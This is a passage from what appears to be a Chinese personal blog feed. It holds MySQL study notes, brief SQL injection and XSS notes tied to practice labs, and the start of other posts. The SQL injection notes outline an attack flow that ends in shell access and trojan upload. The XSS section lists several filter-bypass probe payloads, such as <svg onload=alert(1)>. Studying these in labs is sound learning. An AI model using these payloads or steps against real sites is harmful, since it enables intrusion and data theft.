JOIN</a>。</li><li>两个表中有重复的字段名，起别名加以区分。</li><li>表名&#x2F;字段名较长，或者可读性差。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- YEAR(..): 取出日期中的年份</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">no</span>, name, birthday <span class="hljs-keyword">FROM</span> student<br><span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">YEAR</span>(birthday) <span class="hljs-keyword">IN</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">YEAR</span>(birthday) <span class="hljs-keyword">FROM</span> student <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">IN</span> (<span class="hljs-number">101</span>, <span class="hljs-number">108</span>));<br></code></pre></td></tr></table></figure><p><strong>UNION</strong> 子句&#x2F;运算符用于合并两个或者多个 SELECT 语句的结果集</p><ul><li>默认地，UNION 运算符会过滤掉两个结果集中重复的记录，只保留其中一条，也就是对两个结果集进行并集操作；此外，UNION 还会按照默认规则对结果集进行排序。</li><li>如果希望保留原始结果，使用UNION ALL</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- NOT: 代表逻辑非</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> teacher <span class="hljs-keyword">WHERE</span> department <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;计算机系&#x27;</span> <span class="hljs-keyword">AND</span> profession <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">IN</span> (<br>    <span class="hljs-keyword">SELECT</span> profession <span class="hljs-keyword">FROM</span> teacher <span class="hljs-keyword">WHERE</span> department <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;电子工程系&#x27;</span><br>)<br><span class="hljs-comment">-- 合并两个集</span><br><span class="hljs-keyword">UNION</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> teacher <span class="hljs-keyword">WHERE</span> department <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;电子工程系&#x27;</span> <span class="hljs-keyword">AND</span> profession <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">IN</span> (<br>    <span class="hljs-keyword">SELECT</span> profession <span class="hljs-keyword">FROM</span> teacher <span class="hljs-keyword">WHERE</span> department <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;计算机系&#x27;</span><br>);<br><br><span class="hljs-comment">-- ANY: 符合SQL语句中的任意条件。</span><br><span class="hljs-comment">-- ALL: 符合所有的条件</span><br><span class="hljs-comment">-- 查询课程 3-105 且成绩 至少 高于 3-245 的 score 表。</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> score <span class="hljs-keyword">WHERE</span> c_no <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;3-105&#x27;</span> <span class="hljs-keyword">AND</span> degree <span class="hljs-operator">&gt;</span> <span class="hljs-keyword">ANY</span>(<br>    <span class="hljs-keyword">SELECT</span> degree <span class="hljs-keyword">FROM</span> score <span class="hljs-keyword">WHERE</span> c_no <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;3-245&#x27;</span><br>) <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> degree <span class="hljs-keyword">DESC</span>;<br></code></pre></td></tr></table></figure><p><strong>IF查询</strong>：if条件查询，expr1为true时返回expr2，false返回expr3</p><p><code>IF(expr1,expr2,expr3);</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">#牛客题目sql26<br>#将用户划分为25岁以下和25岁及以上两个年龄段，分别查看这两个年龄段用户数量<br>select age_cut,count(device_id) as number from <br>(select if(age&gt;=25,&#x27;25岁及以上&#x27;,&#x27;25岁以下&#x27;) as age_cut,device_id from user_profile)u2<br>group by age_cut<br></code></pre></td></tr></table></figure><h2 id="约束"><a href="#约束" class="headerlink" title="约束"></a>约束</h2><p><strong>主键【PRIMARY KEY】</strong>：使某个字段不重复且不得为空，确保表内所有数据的唯一性。</p><p><strong>联合主键【PRIMARY KEY(a, b)】</strong>：联合主键中的每个字段都不能为空，并且不能和已设置的联合主键重复。</p><p><strong>自增约束【PRIMARY KEY AUTO_INCREMENT】</strong>：自增约束的主键由系统自动递增分配。</p><p><strong>唯一主键【UNIQUE(a)】</strong></p><p><strong>非空约束【NOT NULL】</strong></p><p><strong>默认约束【DEFAULT xx】</strong></p><p>**外键约束【FOREIGN KEY(a) REFERENCES ** <em>table_name</em> <strong>(b)】</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 联合主键</span><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-keyword">user</span> (<br>    id <span class="hljs-type">INT</span>,<br>    name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">20</span>),<br>    password <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">20</span>),<br>    <span class="hljs-keyword">PRIMARY</span> KEY(id, name)<br>);<br><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">values</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;pat&#x27;</span>,<span class="hljs-string">&#x27;123456&#x27;</span>);<br>Query OK, <span class="hljs-number">1</span> <span class="hljs-type">row</span> affected (<span class="hljs-number">0.01</span> sec)<br><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">values</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;tim&#x27;</span>,<span class="hljs-string">&#x27;123456&#x27;</span>);<br>Query OK, <span class="hljs-number">1</span> <span class="hljs-type">row</span> affected (<span class="hljs-number">0.01</span> sec)<br><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">values</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;pat&#x27;</span>,<span class="hljs-string">&#x27;123456&#x27;</span>);<br>ERROR <span class="hljs-number">1062</span> (<span class="hljs-number">23000</span>): Duplicate entry <span class="hljs-string">&#x27;1-pat&#x27;</span> <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;user.PRIMARY&#x27;</span><br><br><span class="hljs-comment">-- 自增约束</span><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> user2 (<br>    <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>     id <span class="hljs-type">INT</span> <span class="hljs-keyword">PRIMARY</span> KEY AUTO_INCREMENT,<br>    <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span>     name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">20</span>)<br>    <span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> );<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">0.01</span> sec)<br><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> user2(name) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;a&#x27;</span>),(<span class="hljs-string">&#x27;b&#x27;</span>),(<span class="hljs-string">&#x27;c&#x27;</span>);<br>Query OK, <span class="hljs-number">3</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">0.00</span> sec)<br>Records: <span class="hljs-number">3</span>  Duplicates: <span class="hljs-number">0</span>  Warnings: <span class="hljs-number">0</span><br><br>mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> user2;<br><span class="hljs-operator">+</span><span class="hljs-comment">----+------+</span><br><span class="hljs-operator">|</span> id <span class="hljs-operator">|</span> name <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+------+</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">1</span> <span class="hljs-operator">|</span> a    <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">2</span> <span class="hljs-operator">|</span> b    <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">3</span> <span class="hljs-operator">|</span> c    <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+------+</span><br><span class="hljs-number">3</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><br><span class="hljs-comment">-- 外键约束</span><br><span class="hljs-comment">-- 班级</span><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> classes (<br>    id <span class="hljs-type">INT</span> <span class="hljs-keyword">PRIMARY</span> KEY,<br>    name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">20</span>)<br>);<br><br><span class="hljs-comment">-- 学生表</span><br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> students (<br>    id <span class="hljs-type">INT</span> <span class="hljs-keyword">PRIMARY</span> KEY,<br>    name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">20</span>),<br>    <span class="hljs-comment">-- 这里的 class_id 要和 classes 中的 id 字段相关联</span><br>    class_id <span class="hljs-type">INT</span>,<br>    <span class="hljs-comment">-- 表示 class_id 的值必须来自于 classes 中的 id 字段值</span><br>    <span class="hljs-keyword">FOREIGN</span> KEY(class_id) <span class="hljs-keyword">REFERENCES</span> classes(id)<br>);<br><br><span class="hljs-comment">-- 1. 主表（父表）classes 中没有的数据值，在副表（子表）students 中，是不可以使用的；</span><br><span class="hljs-comment">-- 2. 主表中的记录被副表引用时，主表不可以被删除。</span><br></code></pre></td></tr></table></figure><p>忘记添加主键约束的<strong>补充</strong>办法&amp;<strong>删除</strong>主键办法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 添加主键约束</span><br><span class="hljs-comment">-- 如果忘记设置主键，还可以通过SQL语句设置（两种方式）：</span><br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">ADD</span> <span class="hljs-keyword">PRIMARY</span> KEY(id);<br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-keyword">user</span> MODIFY id <span class="hljs-type">INT</span> <span class="hljs-keyword">PRIMARY</span> KEY;<br><br><span class="hljs-comment">-- 删除主键</span><br><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">drop</span> <span class="hljs-keyword">PRIMARY</span> KEY;<br></code></pre></td></tr></table></figure><h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><p><strong>Join</strong> 是“连接”的意思，顾名思义，SQL JOIN 子句用于将两个或者多个表联合起来进行查询。</p><p><strong>INNER JOIN(内连接)</strong> 是 SQL 中最重要、最常用的表连接形式，只有当连接的两个或者多个表中都存在满足条件的记录时，才返回行。</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-09-28%20%E4%B8%8B%E5%8D%884.21.23.png" alt="截屏2023-09-28 下午4.21.23" style="zoom:50%;" /><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- INNER JOIN: 表示为内连接，将两张表拼接在一起。</span><br><span class="hljs-comment">-- on: 表示要执行某个条件。</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> person <span class="hljs-keyword">INNER</span> <span class="hljs-keyword">JOIN</span> card <span class="hljs-keyword">on</span> person.cardId <span class="hljs-operator">=</span> card.id;<br></code></pre></td></tr></table></figure><p><strong>LEFT JOIN(左连接)</strong> 和 **RIGHT JOIN(右连接)**是相对的，</p><ul><li>LEFT JOIN 将返回左表（table1）中的所有记录，即使右表（table2）中没有匹配的记录也是如此。当右表中没有匹配的记录时，LEFT JOIN 仍然返回一行，只是该行的左表字段有值，而右表字段以 NULL 填充。</li><li>RIGHT JOIN 将返回右表（table2）中的所有记录，即使左表（table1）中没有匹配的记录也是如此。当左表中没有匹配的记录时，RIGHT JOIN 仍然返回一行，只是该行的右表字段有值，而左表字段以 NULL 填充。</li></ul><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-09-28%20%E4%B8%8B%E5%8D%884.21.41.png" alt="截屏2023-09-28 下午4.21.41" style="zoom:50%;" /><p><strong>FULL JOIN(全连接)</strong> 将返回左表（table1）和右表（table1）中的所有记录，相当于 LEFT JOIN 和 RIGHT JOIN的叠加。(mysql不支持，使用union可实现效果)</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-09-28%20%E4%B8%8B%E5%8D%884.22.01.png" alt="截屏2023-09-28 下午4.22.01" style="zoom:50%;" /><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> person <span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> card <span class="hljs-keyword">on</span> person.cardId <span class="hljs-operator">=</span> card.id<br><span class="hljs-keyword">UNION</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> person <span class="hljs-keyword">RIGHT</span> <span class="hljs-keyword">JOIN</span> card <span class="hljs-keyword">on</span> person.cardId <span class="hljs-operator">=</span> card.id;<br></code></pre></td></tr></table></figure><h2 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h2><p>事务（ Transaction）由一次或者多次基本操作构成，或者说，事务由一条或者多条 SQL 语句构成。</p><p>在 MySQL 中，事务其实是一个最小的不可分割的工作单元。事务能够<strong>保证一个业务的完整性</strong>。</p><p>事务中的所有 SQL 语句是一个整体，共同进退，不可分割，<strong>要么全部执行成功，要么全部执行失败</strong>。</p><p>事务具有四个标准属性，分别是原子性（<strong>A</strong>tomicity，或称不可分割性）、一致性（<strong>C</strong>onsistency）、隔离性（<strong>I</strong>solation，又称独立性）、持久性（<strong>D</strong>urability），简称 <strong>ACID</strong>。（<a href="http://c.biancheng.net/sql/transaction.html">详解</a>)</p><p><strong>事务的隔离性可分为四种 ( 性能从低到高 )</strong> ：</p><ol><li><p><strong>READ UNCOMMITTED ( 读取未提交 )</strong></p><p>如果有多个事务，那么任意事务都可以看见其他事务的<strong>未提交数据</strong>。</p><p>脏读。</p></li><li><p><strong>READ COMMITTED ( 读取已提交 )</strong></p><p>只能读取到其他事务<strong>已经提交的数据</strong>。      </p><p>虽然 <strong>READ COMMITTED</strong> 让我们只能读取到其他事务已经提交的数据，但还是会出现问题，就是<strong>在读取同一个表的数据时，可能会发生前后不一致的情况</strong>。这被称为<strong>不可重复读现象 ( READ COMMITTED )</strong> 。</p></li><li><p><strong>REPEATABLE READ ( 可被重复读 )</strong></p><p>如果有多个连接都开启了事务，那么事务之间不能共享数据记录，否则只能共享已提交的记录。</p><p>可能会产生<strong>幻读</strong>。</p></li><li><p><strong>SERIALIZABLE ( 串行化 )</strong></p><p>所有的事务都会按照<strong>固定顺序执行</strong>，执行完一个事务后再继续执行下一个事务的<strong>写入操作</strong>。</p></li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 查看隔离级别</span><br><span class="hljs-comment">-- MySQL 8.x, GLOBAL 表示系统级别，不加表示会话级别。</span><br><span class="hljs-keyword">SELECT</span> @<span class="hljs-variable">@GLOBAL</span>.TRANSACTION_ISOLATION;<br><span class="hljs-keyword">SELECT</span> @<span class="hljs-variable">@TRANSACTION</span>_ISOLATION;<br><br><span class="hljs-comment">-- MySQL 5.x</span><br><span class="hljs-keyword">SELECT</span> @<span class="hljs-variable">@GLOBAL</span>.TX_ISOLATION;<br><span class="hljs-keyword">SELECT</span> @<span class="hljs-variable">@TX</span>_ISOLATION;<br><br><span class="hljs-comment">-- 设置隔离级别</span><br><span class="hljs-keyword">SET</span> <span class="hljs-keyword">GLOBAL</span> TRANSACTION ISOLATION LEVEL xxx(隔离类型);<br></code></pre></td></tr></table></figure><p>与事务控制有关的 SQL 命令包括：</p><ul><li>BEGIN 或者 START TRANSACTION：开始事务；(手动开启一个事务处理事件)</li><li>COMMIT：提交事务；（提交后不可回滚）</li><li>ROLLBACK：回滚事务；（回到最后一次提交数据的状态）</li><li>SAVEPOINT：在事务内部设置回滚标记点；</li><li>RELEASE SAVEPOINT：删除回滚标记点；</li><li>ROLLBACK TO：将事务回滚到标记点（ROLLBACK 命令的一种变形写法）。</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 查询事务的自动提交状态(默认开启)</span><br><span class="hljs-keyword">SELECT</span> @<span class="hljs-variable">@AUTOCOMMIT</span>;<br><span class="hljs-comment">-- 关闭自动提交</span><br><span class="hljs-keyword">SET</span> AUTOCOMMIT <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>靶场笔记：**<a href="https://sheepandbread.github.io/2020/10/30/old/%E5%9F%B9%E8%AE%AD/%E5%9F%B9%E8%AE%ADday3/index.html#sqli-labs">sqli-labs</a>|<a href="https://sheepandbread.github.io/2020/10/30/old/%E5%9F%B9%E8%AE%AD/%E5%9F%B9%E8%AE%ADday3/index.html#BUUCTF">BUUCTF</a>|<a href="https://sheepandbread.github.io/2021/07/06/old/dvwa2/#%E4%B8%83%E3%80%81SQL-Injection%EF%BC%88sql%E6%B3%A8%E5%85%A5%EF%BC%89">DVWA-sql部分</a>**</p><p><strong>常见的注入类型</strong>：联合注入、布尔注入、报错注入、时间注入、堆叠注入、二次注入、宽字节注入、cookie注入等。</p><p><strong>SQL注入的产生需要两个条件</strong></p><ol><li>我们传递给后端的参数是可以控制的</li><li>参数内容会被带入到数据库查询</li></ol><p><strong>SQL Inject 漏洞攻击流程：</strong></p><ol><li><p><strong>注入点探测</strong></p><ol><li>自动方式：使用web漏洞扫描工具，自动进行注入点发现</li><li>手动方式：手工构造sql inject测试语句进行注入点发现</li></ol></li><li><p><strong>信息收集</strong></p><p>通过注入点取期望得到的数据</p><p>（1）环境信息：数据库类型，数据库版本，操作系统版本，用户信息等</p><p>（2）数据库信息：数据库名称，数据库表，表字段，字段内容，甚至加密的内容也可能会被破解</p><blockquote><p>mysql 5.0以上版本自带数据库，information_schema记录有当前mysql下所有数据库名，表名，列名信息。下列是存放各信息的名字</p><p>information_schema.schemata：记录数据库信息的表<br>information_schema.tables：记录表名信息的表<br>information_schema.columns：记录列名信息的表<br>schema_name 数据库名<br>table_name 表名<br>column_name 列名<br>table_schema 数据库名</p></blockquote></li><li><p><strong>获取权限</strong></p><p>获取操作系统权限：通过数据库执行shell，上传木马</p></li></ol><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p><strong>练习平台：</strong></p><p>xss【<a href="https://xss.haozi.me/#/0x00">在线平台</a> ｜<a href="https://sheepandbread.github.io/2020/11/03/old/%E5%9F%B9%E8%AE%AD/%E5%9F%B9%E8%AE%ADday4/index.html">笔记</a>】</p><p>pikachu【<a href="https://sheepandbread.github.io/2023/04/25/2023/pikachu%E9%9D%B6%E5%9C%BA%EF%BC%88+%E5%88%86%E6%9E%90%EF%BC%89/">笔记</a>】</p><p><strong>XSS（跨站脚本）概述</strong></p><p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。</p><p>XSS是一种前端漏洞，主要发生原因是前端没有对输入输出进行是当处理过滤。</p><p><strong>常见的类型有：</strong></p><p>1、反射性XSS（非持续型攻击，攻击者构造后【带xss的url】等待对方触发。一次型，不会写入数据库）</p><p>2、存储型XSS（持续型攻击，将跨站代码植入到网站数据库。一次成功，其他访问者都会收到攻击【例如 <a href="%E8%BF%87%E5%8E%BB%E7%9F%A5%E8%AF%86%E7%82%B9%E7%AE%80%E5%8D%95%E6%95%B4%E5%90%88.md">过去知识点简单整合.md</a> 留言板】）</p><p>3、DOM型XSS</p><p>​DOM即文档对象模型，是W3C制定的标准接口规范，是一种处理HTML和XML文件的标准API。</p><p>​只在前端。</p><p><strong>输入过滤</strong>：对输入进行过滤，不允许可能导致XSS攻击的字符输入;</p><p><strong>输出转义</strong>：根据输出点的位置对输出到前端的内容进行适当转义;</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;1&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 当()被过滤 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">alert<span class="hljs-string">`1`</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert<span class="hljs-symbol">&amp;#40;</span>1<span class="hljs-symbol">&amp;#41;</span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span>  <span class="hljs-comment">&lt;!-- &amp;#40是( ,也可以使用&amp;#96 ` --&gt;</span><br><br>  <span class="hljs-comment">&lt;!-- 闭合被过滤 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(1)</span></span><br><span class="hljs-tag">     </span><br></code></pre></td></tr></table></figure><h1 id="参考-amp-备注"><a href="#参考-amp-备注" class="headerlink" title="参考&amp;备注"></a>参考&amp;备注</h1><p><strong>——参考——</strong></p><p>[1]: <a href="https://zhuanlan.zhihu.com/p/410731610">https://zhuanlan.zhihu.com/p/410731610</a>“python之进程process”</p><p><strong>c语言中文网-sql</strong>：<a href="http://c.biancheng.net/sql/what-is-sql.html">http://c.biancheng.net/sql/what-is-sql.html</a></p><p><strong>mysql笔记</strong>：<a href="https://github.com/baa-god/sql_node/blob/master/mysql/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.md">https://github.com/baa-god/sql_node/blob/master/mysql/MySQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.md</a></p><p><strong>sql注入：</strong><a href="https://www.freebuf.com/articles/web/256097.html">https://www.freebuf.com/articles/web/256097.html</a></p><p><strong>菜鸟教程</strong>：<a href="https://www.runoob.com/">https://www.runoob.com/</a></p><hr><p><strong>——脚注——</strong></p><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>子进程是父进程的一个拷贝，但是子进程拥有自己的PID<a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>杂</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>mysql</tag>
      
      <tag>sql注入</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello - New - World</title>
    <link href="/2023/03/19/2023/hello-world/"/>
    <url>/2023/03/19/2023/hello-world/</url>
    
    <content type="html"><![CDATA[<style>#box2{  width: 100px;  height: 50px;  background-color: #f8bf74;  border: solid 0px white;  border-radius: 50px;  margin-left: 50px;}#box3{  width: 200px;  height: 50px;  margin-left: 0px;  border-radius: 50px;  background-color: #fcce92;  border: solid 2px #d6650a;}#box3:before{  background-color: #fcce92;  content: '- 你好 :)  ';  color: #ffaa00;}#hia{  margin-top: 20px;  margin-left: 60px;  color: #d6650a;}#ha{  display: none;    margin-left: 60px;    margin-bottom: -5px;     width: 80px;}</style><script>  a = true;  function onclickFunny(){    a = false;    $("#ha").css("display","block");    setTimeout(function(){      $("#ha").css("display","none");    },2000);  }  function onmouse(x){    if (a) {    document.getElementById("box2").id = 'box3';    }  }  function outmouse(x){    if (a) {      document.getElementById("box3").id = 'box2';    }  } </script><h3 id="hia">重开博客！</h3><div id="box">  <img id="ha" src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E5%B0%8F%E5%85%B0.png">  <button id="box2" onmousemove="onmouse(this)" onclick="onclickFunny()"onmouseout="outmouse(this)">🍞</button></div><br/><p>究竟谁在我的网站上挂字母啊？:( </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>用beautifulsoup简单爬取英语音频</title>
    <link href="/2022/03/31/old/%E7%94%A8beautifulsoup%E7%AE%80%E5%8D%95%E7%88%AC%E5%8F%96%E8%8B%B1%E8%AF%AD%E9%9F%B3%E9%A2%91/"/>
    <url>/2022/03/31/old/%E7%94%A8beautifulsoup%E7%AE%80%E5%8D%95%E7%88%AC%E5%8F%96%E8%8B%B1%E8%AF%AD%E9%9F%B3%E9%A2%91/</url>
    
    <content type="html"><![CDATA[<p>环境：macbook pro</p><p>beautiful soup官方文档：<a href="https://beautifulsoup.readthedocs.io/zh_CN/latest/">https://beautifulsoup.readthedocs.io/zh_CN/latest/</a></p><p>urllib的菜鸟教程：<a href="https://www.runoob.com/python3/python-urllib.html">https://www.runoob.com/python3/python-urllib.html</a></p><p>很久没写python了，随便整个东西熟悉下（正好最近背单词，一个个下载真的好麻烦）。</p><h2 id="1-思路"><a href="#1-思路" class="headerlink" title="1.思路"></a>1.思路</h2><p>要下载的mp3在不同的页面，需要通过目录点进去后才能找到下载地址。</p><p>所以实现两个功能，下载和查找。</p><p>1.获得目录页所有单页的链接。</p><p>1.单页mp3链接的查找</p><p>2.下载mp3到指定目录</p><h2 id="2-实操"><a href="#2-实操" class="headerlink" title="2.实操"></a>2.实操</h2><p>先查看需要爬取的mp3的页面的源码。<img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8A%E5%8D%8811.24.21.png" alt="截屏2022-03-30 上午11.24.21"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span 